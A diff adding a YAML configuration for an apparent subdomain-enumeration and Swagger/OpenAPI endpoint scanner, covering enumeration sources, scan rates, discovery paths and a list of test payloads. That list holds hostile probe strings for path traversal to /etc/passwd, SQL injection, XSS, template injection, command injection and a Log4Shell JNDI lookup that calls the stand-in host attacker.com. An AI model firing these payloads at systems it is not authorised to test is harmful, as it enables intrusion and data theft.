@@ -1,0 +1,81 @@
+subfinder:
+  sources:
+    - alienvault
+    - anubis
+    - bufr
+    - certspotter
+    - chinaz
+    - crtsh
+    - dnsdumpster
+    - hackertarget
+    - rapiddns
+    - sublist3r
+    - threatcrowd
+    - virustotal
+  recursive: false
+  all: false
+  threads: 10
+  timeout: 30
+  max_enumeration: 10
+
+scanner:
+  threads: 50
+  timeout: 30
+  rate_limit: 5
+  depth: 3
+  follow_redirect: true
+  retries: 3
+  user_agents:
+    - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
+    - "Swagger-UI/1.0"
+    - "PostmanRuntime/7.28.4"
+  proxy: ""
+
+swagger:
+  common_paths:
+    - "/swagger.json"
+    - "/swagger.yaml"
+    - "/swagger.yml"
+    - "/api/swagger.json"
+    - "/api-docs"
+    - "/openapi.json"
+    - "/openapi.yaml"
+    - "/v2/api-docs"
+    - "/v3/api-docs"
+    - "/swagger-ui.html"
+    - "/swagger-resources/configuration/ui"
+  extensions:
+    - ".json"
+    - ".yaml"
+    - ".yml"
+  max_depth: 5
+  test_endpoints: true
+  test_payloads:
+    - "../../../../etc/passwd"
+    - "' OR '1'='1"
+    - "<script>alert(1)</script>"
+    - "${7*7}"
+    - "${jndi:ldap://attacker.com/a}"
+    - "||ping -c 10 127.0.0.1||"
+    - "1; SELECT SLEEP(5)"
+
+output:
+  directory: "results"
+  formats:
+    - "json"
+    - "html"
+    - "md"
+  verbose: false
+  save_raw: true
+
+api:
+  shodan: ""
+  securitytrails: ""
+  censys: ""
+  binaryedge: ""
+
+wordlists:
+  subdomains: "wordlists/subdomains.txt"
+  swagger_paths: "wordlists/swagger_paths.txt"
+  common_files: "wordlists/common_files.txt"
